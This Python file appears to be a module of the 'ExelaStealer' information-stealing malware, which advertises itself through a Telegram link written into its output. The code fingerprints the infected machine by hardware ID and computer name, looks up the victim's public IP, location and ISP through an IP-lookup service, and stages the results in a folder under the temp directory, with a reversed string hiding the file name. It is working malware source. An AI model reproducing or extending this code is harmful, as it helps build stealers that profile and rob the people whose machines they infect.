import os, genHwid
import requests

serialNumber = genHwid.Gen().get_hwid_number() 
name = os.getenv("computername")

class Network:
    def __init__(self) -> None:
        self.path = os.getenv("temp")
        self.unifiedPath = os.path.join(self.path + "\\" + serialNumber + "__" + name)
        self.country = None
        self.city = None
        self.timezone = None
        self.isp = None
        self.ip = None
        self.testinternet()
    def Run(self):
        req = requests.get("http://ip-api.com/json").json()
        self.country = req["country"]
        self.city = req["city"]
        self.timezone = req["timezone"]
        self.isp = req["isp"] + " " + req["org"] + " " + req["as"]
        self.ip = req["query"]
    def writeText(self):
        value = "krowteN"[::-1]
        if not os.path.isdir(self.unifiedPath):
            try:
                os.mkdir(self.unifiedPath)
                with open(self.unifiedPath + f"\\{value}.txt", "a", encoding="utf-8", errors="ignore") as quica:
                    quica.write("---------https://t.me/ExelaStealer---------\n"+ "==================================================\n")
                    quica.write(str(f"Country : {self.country}\nCity : {self.city}\nTimezone : {self.timezone}\nISP : {self.isp}\nIP : {self.ip}"))
            except Exception as e:
                pass
        else:
            try:                
                with open(self.unifiedPath + f"\\{value}.txt", "w", encoding="utf-8", errors="ignore") as quica:
                    quica.write("---------https://t.me/ExelaStealer---------\n"+ "==================================================\n")
                    quica.write(str(f"Country : {self.country}\nCity : {self.city}\nTimezone : {self.timezone}\nISP : {self.isp}\nIp : {self.ip}")) 
            except Exception as e:
                pass
    def testinternet(self):
        if not requests.get("https://google.com").status_code == 200:
            exit()
        else:
           self.Run()
           self.writeText()
